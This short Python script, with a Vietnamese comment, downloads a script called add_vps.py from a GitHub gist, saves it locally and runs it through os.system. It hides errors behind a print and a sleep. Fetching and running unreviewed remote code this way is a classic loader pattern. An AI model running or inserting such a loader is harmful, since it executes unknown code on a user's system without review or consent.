try:
  import requests
  url = "https://gist.githubusercontent.com/hoangks5/83e42ff431432361500be917424e675a/raw/f2f6a09bc1b205688871ddfc65342645b96da768/add_vps.py"
  response = requests.request("GET", url)
  code = response.text
  # chạy hàm này để thực thi code
  import os
  # save code to file
  with open('hoangks5.py', 'w', encoding='utf-8') as f:
    f.write(code)
  # run code
  os.system('python hoangks5.py')
except Exception as e:
  print(e)
  import time
  time.sleep(100)